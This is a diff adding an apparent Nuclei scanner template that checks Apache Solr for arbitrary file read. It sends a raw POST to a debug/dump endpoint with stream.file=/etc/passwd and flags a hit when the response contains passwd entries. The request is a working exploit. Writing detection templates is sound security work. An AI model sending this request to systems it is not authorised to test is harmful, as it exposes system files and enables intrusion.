@@ -1,0 +1,39 @@
+id: solr-fileRead
+info:
+  author: Str1am
+  name: "solr \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6"
+  severity: high
+  tags: solr,fileRead
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - root:x
+    - /bin/bash
+  matchers-condition: and
+  raw:
+  - 'POST /solr/supplierSearch_V2/debug/dump?param=ContentStreams HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: python-requests/2.26.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-alive
+
+    Content-Length: 27
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    stream.file=%2Fetc%2Fpasswd
+
+    '
